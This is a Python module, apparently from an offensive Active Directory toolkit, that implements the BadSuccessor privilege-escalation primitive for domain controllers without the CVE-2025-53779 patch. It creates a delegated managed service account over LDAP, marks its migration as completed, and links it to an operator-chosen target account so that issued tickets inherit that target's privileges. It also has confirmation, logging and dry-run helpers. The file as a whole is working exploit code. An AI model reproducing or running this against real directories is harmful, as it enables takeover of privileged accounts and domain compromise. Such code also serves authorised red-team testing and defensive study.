from __future__ import annotations

from typing import TYPE_CHECKING

from dmsa_reaper.ldap.modify import add_object
from dmsa_reaper.models import Operation, PathCandidate
from dmsa_reaper.ops.operation_log import new_operation, save_operation
from dmsa_reaper.primitives._ldap_helpers import (
    DMSA_MANAGED_PASSWORD_INTERVAL,
    DMSA_OBJECT_CLASSES,
    DMSA_STATE_COMPLETED,
    DMSA_UAC,
    dmsa_dn,
    generate_dmsa_name,
    journal_created_object,
    resolve_meta,
)
from dmsa_reaper.primitives.base import Primitive, PrimitiveError

if TYPE_CHECKING:
    from ldap3 import Connection


class LegacyOneWayLinkPrimitive(Primitive):
    """Create a new dMSA and set msDS-ManagedAccountPrecededByLink to point at a target.

    Pre-CVE-2025-53779 (unpatched) path. The link is established
    at creation time so there is only one LDAP write.

    Requires:
        - CreateChild:msDS-DelegatedManagedServiceAccount on the container.
        - A target DN to link to (operator-supplied via --target-dn).
    """

    name = "legacy-oneway-link"

    def check(self, path: PathCandidate) -> bool:
        return path.primitive == self.name

    def plan(self, path: PathCandidate) -> Operation:
        return new_operation(
            primitive=self.name,
            path_id=path.id,
            metadata={"path": path.model_dump()},
        )

    def execute(
        self,
        operation: Operation,
        *,
        confirm: bool = False,
        conn: "Connection | None" = None,
    ) -> Operation:
        if not confirm:
            raise PrimitiveError("--confirm is required for LDAP writes")
        if conn is None:
            raise PrimitiveError("--confirm requires an active LDAP connection")

        meta = operation.metadata
        container_dn = resolve_meta(meta, "container_dn")
        target_dn = resolve_meta(meta, "target_dn")
        if not container_dn:
            raise PrimitiveError("container_dn is required in operation metadata")
        if not target_dn:
            raise PrimitiveError(
                "target_dn is required in operation metadata (pass --target-dn)"
            )

        cn = generate_dmsa_name(meta.get("dmsa_name"))
        new_dn = dmsa_dn(cn, container_dn)
        sam = f"{cn}$"

        # Record the intended DN before the LDAP write. If the server applies
        # the add but the client receives an exception, the operation log still
        # shows the DN that may now exist.
        operation.status = "running"
        operation.maybe_created_dns.append(new_dn)
        operation.metadata["created_dmsa_dn"] = new_dn
        operation.metadata["created_dmsa_sam"] = sam
        save_operation(operation)

        try:
            add_object(
                conn,
                new_dn,
                DMSA_OBJECT_CLASSES,
                {
                    "sAMAccountName": sam,
                    "userAccountControl": DMSA_UAC,
                    "msDS-ManagedPasswordInterval": DMSA_MANAGED_PASSWORD_INTERVAL,
                    # State 2 = migration completed: required by the KDC to issue
                    # PAC-inheriting tickets in the BadSuccessor technique.
                    "msDS-DelegatedMSAState": DMSA_STATE_COMPLETED,
                    "msDS-ManagedAccountPrecededByLink": target_dn,
                },
            )
            journal_created_object(operation, conn, new_dn)
        except Exception as exc:
            operation.status = "failed"
            operation.errors.append(f"add_object {new_dn}: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            raise

        if new_dn in operation.maybe_created_dns:
            operation.maybe_created_dns.remove(new_dn)
        operation.created_dns.append(new_dn)
        operation.status = "executed"
        save_operation(operation)
        return operation

    def dry_run_steps(self, operation: Operation) -> list[str]:
        meta = operation.metadata
        container_dn = resolve_meta(meta, "container_dn") or "<container_dn>"
        target_dn = resolve_meta(meta, "target_dn") or "<target_dn>"
        cn = generate_dmsa_name(meta.get("dmsa_name"))
        new_dn = dmsa_dn(cn, container_dn)
        sam = f"{cn}$"
        return [
            "WARNING: This targets legacy/pre-patch behavior. "
            "Patched KDCs may accept LDAP writes but refuse ticket semantics.",
            "",
            f"CREATE  {new_dn}",
            f"  object classes                          : {', '.join(DMSA_OBJECT_CLASSES)}",
            f"  sAMAccountName                          : {sam}",
            f"  userAccountControl                      : {DMSA_UAC}",
            f"  msDS-ManagedPasswordInterval            : {DMSA_MANAGED_PASSWORD_INTERVAL}",
            f"  msDS-DelegatedMSAState                  : {DMSA_STATE_COMPLETED}  (migration-completed)",
            f"  msDS-ManagedAccountPrecededByLink       : {target_dn}",
            "",
            "  (CN above is an example — a new random suffix is generated at execute time)",
        ]
